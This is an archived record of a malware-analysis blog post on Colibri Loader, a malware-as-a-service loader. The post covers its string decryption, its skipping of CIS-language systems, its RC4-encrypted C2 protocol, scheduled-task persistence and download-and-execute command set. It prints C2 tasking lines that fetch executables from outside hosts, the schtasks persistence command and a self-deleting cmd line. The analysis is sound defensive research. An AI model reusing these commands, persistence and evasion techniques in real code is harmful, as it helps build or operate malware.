{
    "id": "0bf34fa4-8d06-402c-b099-0f94193b81d1",
    "created_at": "2023-01-12T15:00:43.624601Z",
    "updated_at": "2025-03-27T02:06:14.321843Z",
    "deleted_at": null,
    "sha1_hash": "8fd5319869388cdc0b9b38c65f58217a0566edab",
    "title": "2022-02-13 - Colibri Loader - Back to basics",
    "authors": "",
    "file_creation_date": "2022-05-28T00:45:59Z",
    "file_modification_date": "2022-05-28T00:45:59Z",
    "file_size": 433728,
    "plain_text": "# Colibri Loader - Back to basics\n\n**fr3d.hk/blog/colibri-loader-back-to-basics**\n\n1. You are here: [fr3d.hk](https://fr3d.hk/blog/)\n[2. Malware](https://fr3d.hk/blog/category/malware)\n[3. Colibri Loader - Back to basics](https://fr3d.hk/blog/colibri-loader-back-to-basics)\n\nFebruary 13, 2022 - Reading time: 23 minutes\n\nColibri Loader makes use of common malware techniques but presents a new entry into the\nmalware as a service market with some interesting functions.\n\n## Foreword\n\nIt has been close to a year since my last blog post, many things have happened in my\npersonal life since then and have kept me quite occupied. Due to this I have worked with the\n[incredible Casperinous to produce this post. Casperinous researched the malware and](https://twitter.com/casperinous)\npassed a report to me that I then edited a uploaded to create this post!\n\n## Overview\n\nColibri Loader is a malware as a service that offers a residential loader along with a control\npanel written in PHP to give ease of use to the purchasers. The malware author claims to\nhave written the malware in C/ASM and prices their creation at $150/week or $400/month.\nThe malware offers the following functionality:\n\nRun .exe as user or admin (runas+cmd), launch arguments support\nRunning x86 .exe/.dll in memory via LoadPE\nRunning x86 .dll via rundll32\nRunning x86 .dll via LoadLibrary\n\n\n-----\n\nRunning x86 .dll via regsrv32\nExecuting cmd commands\nUpdate the bot with a fresh crypt or a new version\nRemoving a bot from an infected device.\n\nThe malware was put up for sale on 27/08/2021. It has numerous positive reviews.\n\n## String Decryption & Imports\n\nWhen beginning to analyze Colibri we see a lot of issues within the disassembly, such as\nunrecognized functions and invalid call opcodes. To fix the opcodes a potential solution may\nbe to undefine then redefine but we can take this one step further and use the Create\nfunction option. This function in IDA can define the function and set the functions' stack and\nvariables. Unfortunately Colibri is using in-proper opcodes (0xb8) which casues errors during\nfunction definition. Our solution to this is to NOP (null opcode) the in-proper opcodes and\nthen use the create function tool within IDA.\n\nThis clears up the analysis significantly and reveals the entry point of the loader. The\nmalware begins by loading DLLs and resolving functions. To load DLLs Colibri uses\n_LoadLibraryW and makes use of hardcoded arrays which contain the name of the DLL. Once_\nthe exports of the chosen DLL have been located the malware will use a custom hashing\nalgorithm to create a hash of the export name. (See figure 2)\n\n\n-----\n\nFigure 2: Hashing function\n\nColibri's important strings are XOR encrypted within the binary and when retrieved to be\nused by Colibri will be decrypted. Sometimes the string is unencrypted and will be stored\nwithin the key part of the encrypted strings structure. If the string is unencrypted then Colibri\nwill return the key instead of proceeding with the decryption process.\n\n## Checks\n\nBefore carrying out important functions Colibri makes sure that it hasn't been cracked by\nchecking the hardcoded C2 with a hash. This is to make sure that someone hasn't changed\nthe C2 in an attempt to reuse/repurpose the malware. If the check fails then the malware will\n\n\n-----\n\nexit.\n\nBefore continuing with the program flow, Colibri checks the language of the host system to\ndetermine whether they are within the CIS which it attempts to avoid. The malware\nacomplishes this by calling pGetUserDefaultLangID and then comparning the results to the\nfollowing. If Colibri finds a match it will exit.\n\n**Language** **Code**\n\nRussian 1049\n\nBelarusian 1059\n\nGeorgian 1079\n\nKazakh 1087\n\nTajik 1064\n\nUzbek 2115\n\nUkranian 1058\n\nUnknown 106\n\n## Check in\n\nAfter the language checks have been passed Colibri will attempt to reach the C2 and check\nthat it is alive. Before reaching out to the C2, Colibri generates a unique identifier for the C2\nthat is calculated based on the serial number of the infected workstation. Once the UUID is\ngenerated the malware will send a request to the C2 gate with a \"check\" command, if the\ncheck fails and the C2 doesn't reply or does not reply correctly the malware will exit.\n\nThe general network communication of Colibri can be described as the following:\n\nThe malware decrypts a variety of strings, depending on the type of the request (GET\nvs POST). Among those strings, there are:\n\nThe type/command of each request in string format(check|update|ping).\nRC4 keys used to encrypt the content (in case of a POST request and decrypt)\nand also decrypt the response of the server.\nInformation about the version of the loader, but also the current campaign ID.\nIf there is a POST request, the loader encrypts the content of the POST request with\none of the decrypted RC4 keys.\nThe loader received a response from the server. The response is BASE64 encoded.\nAfter decoding the response properly, it is decrypted with one of the RC4 keys.\n\n\n-----\n\nThe response is checked against a set of hardcoded strings that indicate if the\nresponse is valid or not.\n\nColibri has 3 type of commands that are sent within its HTTP requests:\n\n**Command** **Description** **Response**\n\n\ncheck Checks the availability of the C2 server but\nalso whether the workstation has been\ninfected in the past.\n\n\nThe loader accepts the\nstring “SUCCESS” as a\nvalid response.\n\n\nupdate Sends information about the infected system. Colibri doesn't validate the\nresponse\n\nping Requests a task from the C2. If there is a task within the\nC2 it will respond with it.\n\nWhen Colibri checks that the C2 is alive it will use the check command. Once the request is\nsent and a response is received the malware will decode the response using base64 and\nthen use RC4 to decrypt the response. Once the response has been decrypted it will be\ncompared to \"SUCCESS\". If the string and response do not match then the malware will exit.\n\nFigure 3: Handling C2 response\n\n## Persistence\n\nTo maintain a presence on the infected system Colibri will move itself to a different filepath\ndepending on the Windows version. Colibri checks if it is already in the destination and if not\nit will move to the following paths depending on the Windows version.\n\n\n-----\n\nFigure 5: Determine persistence path\n\nDepending on the Windows version Colibri will use the following paths:\n\nWindows 10 or above will use C:\\Users\\\\\n{username}\\\\AppData\\Local\\Microsoft\\WindowsApps\\Get-Variable.exe\nElse for another edition will use C:\\Users\\\n{username}\\Documents\\WindowsPowerShell\\dllhost.exe\n\nOnce moved Colibri will schedule a task with the following command and then exit.\n\n/create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr {path of the loader}\n\n## C2 Communications & Commands\n\nAfter the scheduled task has executed Colibri again it will proceed to send a check in to the\nmalware C2 and register the infection. Colibri has campaign IDs that allow the operator to\nlabel their malware. The malware will send the campaign id, malware version and\ninformation to the C2 using the update command.\n\nFigure 6: Getting system information\n\n\n-----\n\nColibri encrypts the data with RC4 and then base64 encodes it. Then the encrypted\ninformation is POSTed to the C2.\n\nFigure 7: Encryption of system information\n\nNow that the infected system is registered to the C2 Colibri will send \"ping\" commands to the\nC2 to check for new commands and tell the C2 that the infected system is online. When a\n\"ping\" command is sent the C2 can return the response of \"NUPD\" which stands for NEED\nUPDATE, the C2 will respond this when it needs the malware to re-register the infected\nsystem. If the malware receives this response it will re-send the check in information to the\nC2.\n\nIf the malware does not get a response of \"NUPD\" then it will proceed to parse the response\nand determine what command it has received. The command is made up of four arguments\nthat are separated by the '|' character. The command has the following structure.\n\n**ID** **Name** **Description**\n\n\n1 Command\nID\n\n2 Payload\nURL\n\n3 Payload\nArguments\n\n4 Use admin\nprivileges\n\n\nThe ID determines how the command is handled and what data to use.\n\nThe URL of the fie that Colibri will attempt to download and execute.\n\nThe arguments that will accompany the payload. Usually this is used\nwhen the payload is a DLL and Colibri needs to know what export to\nuse.\n\nDetermines if the payload is to be ran with elevated privileges\n\n\nExamples of commands found from public sandboxes:\n\n0|http://80.92.205.102/SpotifySetup1.exe|\n0|https://bitbucket.org/tradercrypto/releases/downloads/lol.exe|\n\nColibri determines what function to call based on the first argument and will dispatch what\ncommand to use depending on what number it is.\n\n\n-----\n\n**Command**\n**ID**\n\n\n**Description** **Parameters**\n\n\n1 Download the payload and delete the file zone\nidentifier. Then execute the payload with rundll32.\n\n2 Download the payload and delete the file zone\nidentifier. Then execute the payload with regsrv32.\n\n3 Download the payload and delete the file zone\nidentifier. Then load the payload with LoadLibraryW\n\n\nPayload URL + Args\n\nPayload URL + Args\n\nPayload URL\n\n\n4 Creates a thread the injects the payload into it Payload URL\n\n5 Executes a command with cmd open Args + Command\n\n\n6 Cleanup infection by deleting persistence and\nremoving itself. Also executes command.\n\n\nFile Path\n\n\n7 Same as 6th but doesn't execute command None\n\n\n0 Download the payload and delete the file zone\nidentifier. Then execute the payload.\n\n\nPayload URL + Args\n+ Admin Rights Flag\n\n\nCommands 0 to 3 are all related to downloading and executing a payload. The malware\nretrieves the payload with the User-Agent \"GoogleBot\". After downloading the payload,\nColibri deletes its file zone identifier and then based on the id, the payload is executed.\n\nFigure 8: Call command depending on ID\n\nThe command id 7 is forcing the loader to delete its persistence mechanism, the scheduled\ntask but also remove itself from the system. The removal is being achieved by using\nShellExecuteW to execute the following command:\n\n\n-----\n\ncmd /c chcp 65001 && ping 127.0.0.1 && DEL /F /S /Q /A {path of file}\n\nCommand id 5 executes the third element in of the ping response arguments by using the\nShellExecuteW API and calls \"cmd open\".\n\nFigure 9: Commands 7 & 5\n\nThe command id 6 borrows elements from the command id 7, but before deleting itself,\nColibri executes a file with “CreateProcessW” API.\n\nFigure 10: Delete itself\n\nLastly the command id 4 is responsible to download the payload and inject it to the current\nmemory space. The injection is simple; The malware allocates space, then copies the\nexecutable and is setting the correct memory permissions on each section, rebuilds the\nimport directory, rebase the code based on the new image base and then transfers the\nexecution to its OEP.\n\n## C2 Panel\n\nThe C2 panel provided is written in PHP and obfuscated, it contains code that will check a\nlicense key along with the expiry date of the malware so that the user can not use the\nmalware past their purchase date.\n\n\n-----\n\nFigure 11: Main Page\n\nFigure 12: Bots Page\n\n\n-----\n\nFigure 14: Tasks Page\n\nFigure 15: Tasks Page Extended\n\n## Epilogue\n\nThe malware does not demonstrate innovation but certainly shows that sticking to the basics\nwill create an effective piece of malware. Colibri is not a common malware seen in the wild\nand does not seem to be holding up its competition with the likes of Smoke Loader and\nAmadey. The malware is not without its flaws but the developer also indicates that they are\nwilling to continually update their creation. I'd like to extend another thank you to the amazing\n[Casperinous without him this blog post could not have been made, please check him out.](https://twitter.com/casperinous)\nThank you for reading and see you in the next blog post!\n\nTools used to analyze Colibri: https://github.com/Casperinous/colibri_loader\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-13 - Colibri Loader - Back to basics.pdf"
    ],
    "report_names": [
        "2022-02-13 - Colibri Loader - Back to basics.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535643,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653698759,
    "ts_modification_date": 1653698759,
    "files": {
        "pdf": "https://archive.orkl.eu/8fd5319869388cdc0b9b38c65f58217a0566edab.pdf",
        "text": "https://archive.orkl.eu/8fd5319869388cdc0b9b38c65f58217a0566edab.txt",
        "img": "https://archive.orkl.eu/8fd5319869388cdc0b9b38c65f58217a0566edab.jpg"
    }
}